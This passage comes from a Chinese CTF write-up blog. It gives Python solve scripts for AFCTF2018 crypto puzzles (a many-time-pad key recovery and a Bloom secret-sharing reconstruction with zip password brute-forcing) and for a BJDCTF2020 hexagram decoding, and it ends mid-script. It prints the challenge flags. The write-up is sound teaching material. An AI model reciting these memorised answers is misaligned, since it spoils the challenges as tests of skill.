class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>val <span class="token keyword">if</span> val <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">else</span> <span class="token string">'00'</span> <span class="token keyword">for</span> val <span class="token keyword">in</span> final_key<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment"># Xor the currently known key with the target cipher</span>    output <span class="token operator">=</span> strxor<span class="token punctuation">(</span>target_cipher<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> final_key_hex<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Fix this sentence:"</span>    <span class="token keyword">print</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>char <span class="token keyword">if</span> index <span class="token keyword">in</span> known_key_positions <span class="token keyword">else</span> <span class="token string">'*'</span> <span class="token keyword">for</span> index<span class="token punctuation">,</span> char <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"n"</span>    <span class="token comment"># WAIT.. MANUAL STEP HERE</span>    <span class="token comment"># This output are printing a * if that character is not known yet</span>    <span class="token comment"># fix the missing characters like this: "Let*M**k*ow if *o&#123;*a" = "cure, Let Me know if you a"</span>    <span class="token comment"># if is too hard, change the target_cipher to another one and try again</span>    <span class="token comment"># and we have our key to fix the entire text!</span>    <span class="token comment"># sys.exit(0) #comment and continue if u got a good key</span>    target_plaintext <span class="token operator">=</span> <span class="token string">"cure, Let Me know if you a"</span>    <span class="token keyword">print</span> <span class="token string">"Fixed:"</span>    <span class="token keyword">print</span> target_plaintext <span class="token operator">+</span> <span class="token string">"n"</span>    key <span class="token operator">=</span> strxor<span class="token punctuation">(</span>target_cipher<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> target_plaintext<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Decrypted msg:"</span>    <span class="token keyword">for</span> cipher <span class="token keyword">in</span> ciphers<span class="token punctuation">:</span>        <span class="token keyword">print</span> strxor<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"nPrivate key recovered: "</span> <span class="token operator">+</span> key <span class="token operator">+</span> <span class="token string">"n"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> ciphers<span class="token punctuation">:</span>    target_fix<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="AFCTF2018-你听过一次一密么"><a href="#AFCTF2018-你听过一次一密么" class="headerlink" title="[AFCTF2018]你听过一次一密么?"></a>[AFCTF2018]你听过一次一密么?</h4><p>将上面的脚本稍作修改，既数据修改一下即可。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token comment">## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017</span><span class="token comment"># Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)</span><span class="token keyword">import</span> string<span class="token keyword">import</span> collections<span class="token keyword">import</span> sets<span class="token punctuation">,</span> sys<span class="token comment"># 11 unknown ciphertexts (in hex format), all encrpyted with the same key</span>c1 <span class="token operator">=</span> <span class="token string">'25030206463d3d393131555f7f1d061d4052111a19544e2e5d'</span>c2 <span class="token operator">=</span> <span class="token string">'0f020606150f203f307f5c0a7f24070747130e16545000035d'</span>c3 <span class="token operator">=</span> <span class="token string">'1203075429152a7020365c167f390f1013170b1006481e1314'</span>c4 <span class="token operator">=</span> <span class="token string">'0f4610170e1e2235787f7853372c0f065752111b15454e0e09'</span>c5 <span class="token operator">=</span> <span class="token string">'081543000e1e6f3f3a3348533a270d064a02111a1b5f4e0a18'</span>c6 <span class="token operator">=</span> <span class="token string">'0909075412132e247436425332281a1c561f04071d520f0b11'</span>c7 <span class="token operator">=</span> <span class="token string">'4116111b101e2170203011113a69001b475206011552050219'</span>c8 <span class="token operator">=</span> <span class="token string">'041006064612297020375453342c17545a01451811411a470e'</span>c9 <span class="token operator">=</span> <span class="token string">'021311114a5b0335207f7c167f22001b44520c15544801125d'</span>c10 <span class="token operator">=</span> <span class="token string">'06140611460c26243c7f5c167f3d015446010053005907145d'</span>c11 <span class="token operator">=</span> <span class="token string">'0f05110d160f263f3a7f4210372c03111313090415481d49'</span>ciphers <span class="token operator">=</span> <span class="token punctuation">[</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">,</span> c4<span class="token punctuation">,</span> c5<span class="token punctuation">,</span> c6<span class="token punctuation">,</span> c7<span class="token punctuation">,</span> c8<span class="token punctuation">,</span> c9<span class="token punctuation">,</span> c10<span class="token punctuation">,</span> c11<span class="token punctuation">]</span><span class="token comment"># The target ciphertext we want to crack</span><span class="token comment"># target_cipher = "0529242a631234122d2b36697f13272c207f2021283a6b0c7908"</span><span class="token comment"># XORs two string</span><span class="token keyword">def</span> <span class="token function">strxor</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># xor two strings (trims the longer input)</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">target_fix</span><span class="token punctuation">(</span>target_cipher<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># To store the final key</span>    final_key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">150</span>    <span class="token comment"># To store the positions we know are broken</span>    known_key_positions <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># For each ciphertext</span>    <span class="token keyword">for</span> current_index<span class="token punctuation">,</span> ciphertext <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ciphers<span class="token punctuation">)</span><span class="token punctuation">:</span>        counter <span class="token operator">=</span> collections<span class="token punctuation">.</span>Counter<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># for each other ciphertext</span>        <span class="token keyword">for</span> index<span class="token punctuation">,</span> ciphertext2 <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ciphers<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> current_index <span class="token operator">!=</span> index<span class="token punctuation">:</span>  <span class="token comment"># don't xor a ciphertext with itself</span>                <span class="token keyword">for</span> indexOfChar<span class="token punctuation">,</span> char <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>                        strxor<span class="token punctuation">(</span>ciphertext<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ciphertext2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># Xor the two ciphertexts</span>                    <span class="token comment"># If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one)</span>                    <span class="token keyword">if</span> char <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable <span class="token keyword">and</span> char<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> counter<span class="token punctuation">[</span>                        indexOfChar<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token comment"># Increment the counter at this index</span>        knownSpaceIndexes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token comment"># Loop through all positions where a space character was possible in the current_index cipher</span>        <span class="token keyword">for</span> ind<span class="token punctuation">,</span> val <span class="token keyword">in</span> counter<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!</span>            <span class="token keyword">if</span> val <span class="token operator">>=</span> <span class="token number">7</span><span class="token punctuation">:</span> knownSpaceIndexes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ind<span class="token punctuation">)</span>        <span class="token comment"># print knownSpaceIndexes # Shows all the positions where we now know the key!</span>        <span class="token comment"># Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!</span>        xor_with_spaces <span class="token operator">=</span> strxor<span class="token punctuation">(</span>ciphertext<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">' '</span> <span class="token operator">*</span> <span class="token number">150</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> index <span class="token keyword">in</span> knownSpaceIndexes<span class="token punctuation">:</span>            <span class="token comment"># Store the key's value at the correct position</span>            final_key<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> xor_with_spaces<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>            <span class="token comment"># Record that we known the key at this position</span>            known_key_positions<span class="token punctuation">.</span>add<span class="token punctuation">(</span>index<span class="token punctuation">)</span>    <span class="token comment"># Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string)</span>    final_key_hex <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>val <span class="token keyword">if</span> val <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">else</span> <span class="token string">'00'</span> <span class="token keyword">for</span> val <span class="token keyword">in</span> final_key<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment"># Xor the currently known key with the target cipher</span>    output <span class="token operator">=</span> strxor<span class="token punctuation">(</span>target_cipher<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> final_key_hex<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Fix this sentence:"</span>    <span class="token keyword">print</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>char <span class="token keyword">if</span> index <span class="token keyword">in</span> known_key_positions <span class="token keyword">else</span> <span class="token string">'*'</span> <span class="token keyword">for</span> index<span class="token punctuation">,</span> char <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"n"</span>    <span class="token comment"># WAIT.. MANUAL STEP HERE</span>    <span class="token comment"># This output are printing a * if that character is not known yet</span>    <span class="token comment"># fix the missing characters like this: "Let*M**k*ow if *o&#123;*a" = "cure, Let Me know if you a"</span>    <span class="token comment"># if is too hard, change the target_cipher to another one and try again</span>    <span class="token comment"># and we have our key to fix the entire text!</span>    <span class="token comment"># sys.exit(0) #comment and continue if u got a good key</span>    target_plaintext <span class="token operator">=</span> <span class="token string">"ever if the key is kept s"</span>    <span class="token keyword">print</span> <span class="token string">"Fixed:"</span>    <span class="token keyword">print</span> target_plaintext <span class="token operator">+</span> <span class="token string">"n"</span>    key <span class="token operator">=</span> strxor<span class="token punctuation">(</span>target_cipher<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> target_plaintext<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Decrypted msg:"</span>    <span class="token keyword">for</span> cipher <span class="token keyword">in</span> ciphers<span class="token punctuation">:</span>        <span class="token keyword">print</span> strxor<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"nPrivate key recovered: "</span> <span class="token operator">+</span> key <span class="token operator">+</span> <span class="token string">"n"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> ciphers<span class="token punctuation">:</span>    target_fix<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">nPrivate key recovered: afctf&#123;OPT_1s_Int3rest1ng&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="密码混合"><a href="#密码混合" class="headerlink" title="密码混合"></a>密码混合</h2><blockquote><p>有些密码题目太融合了，看起来既不像是古典，又不想是现代，还有些misc的成分在其中，就将其分入此类之中，这一类的题目直接以三级标题命名。</p></blockquote><h3 id="AFCTF2018-花开藏宝地"><a href="#AFCTF2018-花开藏宝地" class="headerlink" title="[AFCTF2018]花开藏宝地"></a>[AFCTF2018]花开藏宝地</h3><p>给出了5个压缩包，应该是每个压缩包对应的都是一种知识点。</p><h4 id="Secret1"><a href="#Secret1" class="headerlink" title="Secret1"></a>Secret1</h4><p>直接对压缩包进行爆破，看起来这一关有些misc的成分混杂于其中了。key是<code>19260817</code></p><p><img src="/2021/05/28/CTF/image-20210729163233973.png" style="zoom:67%;"></p><h4 id="Secret2"><a href="#Secret2" class="headerlink" title="Secret2"></a>Secret2</h4><p>提示是人名，然后就是大小写字母喽，直接再爆破得key2:<code>alice</code></p><p><img src="/2021/05/28/CTF/image-20210729164351421.png" style="zoom: 67%;"></p><h4 id="Secret4"><a href="#Secret4" class="headerlink" title="Secret4"></a>Secret4</h4><p>zip伪加密，修改一下标志位即可。</p><h4 id="Bloom门限方案"><a href="#Bloom门限方案" class="headerlink" title="Bloom门限方案"></a>Bloom门限方案</h4><p><a href="https://webencrypt.org/secretsharing/#bloom">Bloom门限参考链接</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a1 <span class="token operator">=</span><span class="token number">100459779913520540098065407420629954816677926423356769524759072632219106155849450125185205557491138357760494272691949199099803239098119602186117878931534968435982565071570831032814288620974807498206233914826253433847572703407678712965098320122549759579566316372220959610814573945698083909575005303253205653244238542300266460559790606278310650849881421791081944960157781855164700773081375247</span>d1 <span class="token operator">=</span><span class="token number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820820091</span>a2 <span class="token operator">=</span><span class="token number">305345133911395218573790903508296238659147802274031796643017539011648802808763162902335644195648525375518941848430114497150082025133000033835083076541927530829557051524161069423494451667848236452337271862085346869364976989047180532167560796470067549915390773271207901537847213882479997325575278672917648417868759077150999044891099206133296336190476413164240995177077671480352739572539631359</span>d2 <span class="token operator">=</span><span class="token number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820813413</span>a3 <span class="token operator">=</span> <span class="token number">152012681270682340051690627924586232702552460810030322267827401771304907469802591861912921281833890613186317787813611372838066924894691892444503039545946728621696590087591246339208248647926966446848123290344911662916758039134817404720512465817867255277476717353439505243247568126193361558042940352204093381260402400739429050280526212446967632582771424597203000629197487733610187359662268583</span>d3 <span class="token operator">=</span><span class="token number">347051559622463144539669950096658163425646411435797691973701513725701575100810446175849424000000075855070430240507732735393411493866540572679626172742301366146501862670272443070970511943485865887494229487420503750457974262802053722093905126235340380261828593508455621667309946361705530667957484731929151875527489478449361198648310684702574627199321092927111137398333029697068474762820818553</span>dd <span class="token operator">=</span> d1<span class="token operator">*</span>d2<span class="token operator">*</span>d3t1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>dd<span class="token operator">//</span>d1<span class="token punctuation">,</span>d1<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span>d1<span class="token punctuation">)</span><span class="token keyword">assert</span><span class="token punctuation">(</span>t1<span class="token operator">*</span>d2<span class="token operator">*</span>d3<span class="token operator">%</span>d1 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>t2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>dd<span class="token operator">//</span>d2<span class="token punctuation">,</span>d2<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span>d2<span class="token punctuation">)</span><span class="token keyword">assert</span><span class="token punctuation">(</span>t2<span class="token operator">*</span>d1<span class="token operator">*</span>d3<span class="token operator">%</span>d2 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>t3 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>dd<span class="token operator">//</span>d3<span class="token punctuation">,</span>d3<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span>d3<span class="token punctuation">)</span><span class="token keyword">assert</span><span class="token punctuation">(</span>t3<span class="token operator">*</span>d2<span class="token operator">*</span>d1<span class="token operator">%</span>d3 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>s <span class="token operator">=</span> a1<span class="token operator">*</span>t1<span class="token operator">*</span>d2<span class="token operator">*</span>d3<span class="token operator">+</span>a2<span class="token operator">*</span>t2<span class="token operator">*</span>d1<span class="token operator">*</span>d3<span class="token operator">+</span>a3<span class="token operator">*</span>t3<span class="token operator">*</span>d1<span class="token operator">*</span>d2p <span class="token operator">=</span> <span class="token number">80804238007977405688648566160504278593148666302626415149704905628622876270862865768337953835725801963142685182510812938072115996355782396318303927020705623120652014080032809421180400984242061592520733710243483947230962631945045134540159517488288781666622635328316972979183761952842010806304748313326215619695085380586052550443025074501971925005072999275628549710915357400946408857</span>s <span class="token operator">%=</span> dd<span class="token comment"># print(hex(s))</span>s <span class="token operator">%=</span> ps <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token comment"># A treasure map is a map that marks the location of buried treasure, a lost mine, a valuable secret or a hidden locale. So flag is afctf&#123;1sn't_s0_int3Resting&#125;.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="http://www.matrix67.com/blog/archives/1261">参考链接</a></p><h4 id="BJDCTF2020-伏羲六十四卦"><a href="#BJDCTF2020-伏羲六十四卦" class="headerlink" title="[BJDCTF2020]伏羲六十四卦"></a>[BJDCTF2020]伏羲六十四卦</h4><p>给出的附件有个什么六十四卦的编码，我一看就懵逼了，这又是什么古怪的编码？官方wp给出的解码脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc<span class="token operator">=</span><span class="token string">'升随临损巽睽颐萃小过讼艮颐小过震蛊屯未济中孚艮困恒晋升损蛊萃蛊未济巽解艮贲未济观豫损蛊晋噬嗑晋旅解大畜困未济随蒙升解睽未济井困未济旅萃未济震蒙未济师涣归妹大有'</span>mydisc<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'坤'</span><span class="token punctuation">:</span> <span class="token string">'000000'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">:</span> <span class="token string">'000001'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">:</span> <span class="token string">'000010'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">:</span> <span class="token string">'000011'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">:</span> <span class="token string">'000100'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">:</span> <span class="token string">'000101'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">:</span> <span class="token string">'000110'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">:</span> <span class="token string">'000111'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">:</span> <span class="token string">'001000'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">:</span> <span class="token string">'001001'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">:</span> <span class="token string">'001010'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">:</span> <span class="token string">'001011'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">:</span> <span class="token string">'001100'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">:</span> <span class="token string">'001101'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">:</span> <span class="token string">'001110'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">:</span> <span class="token string">'001111'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">:</span> <span class="token string">'010000'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">:</span> <span class="token string">'010001'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">:</span> <span class="token string">'010010'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">:</span> <span class="token string">'010011'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">:</span> <span class="token string">'010100'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">:</span> <span class="token string">'010101'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">:</span> <span class="token string">'010110'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">:</span> <span class="token string">'010111'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">:</span> <span class="token string">'011000'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">:</span> <span class="token string">'011001'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">:</span> <span class="token string">'011010'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">:</span> <span class="token string">'011011'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">:</span> <span class="token string">'011100'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">:</span> <span class="token string">'011101'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">:</span> <span class="token string">'011110'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">:</span> <span class="token string">'011111'</span><span class="token punctuation">,</span> <span class="token string">'复'</span><span class="token punctuation">:</span> <span class="token string">'100000'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">:</span> <span class="token string">'100001'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">:</span> <span class="token string">'100010'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token punctuation">:</span> <span class="token string">'100011'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">:</span> <span class="token string">'100100'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">:</span> <span class="token string">'100101'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">:</span> <span class="token string">'100110'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">:</span> <span class="token string">'100111'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">:</span> <span class="token string">'101000'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">:</span> <span class="token string">'101001'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">:</span> <span class="token string">'101010'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">:</span> <span class="token string">'101011'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">:</span> <span class="token string">'101100'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">:</span> <span class="token string">'101101'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">:</span> <span class="token string">'101110'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">:</span> <span class="token string">'101111'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">:</span> <span class="token string">'110000'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">:</span> <span class="token string">'110001'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">:</span> <span class="token string">'110010'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">:</span> <span class="token string">'110011'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">:</span> <span class="token string">'110100'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">:</span> <span class="token string">'110101'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">:</span> <span class="token string">'110110'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">:</span> <span class="token string">'110111'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">:</span> <span class="token string">'111000'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">:</span> <span class="token string">'111001'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">:</span> <span class="token string">'111010'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">:</span> <span class="token string">'111011'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">:</span> <span class="token string">'111100'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">:</span> <span class="token string">'111101'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">:</span> <span class="token string">'111110'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">:</span> <span class="token string">'111111'</span><span class="token punctuation">&#125;</span>keys<span class="token operator">=</span><span class="token 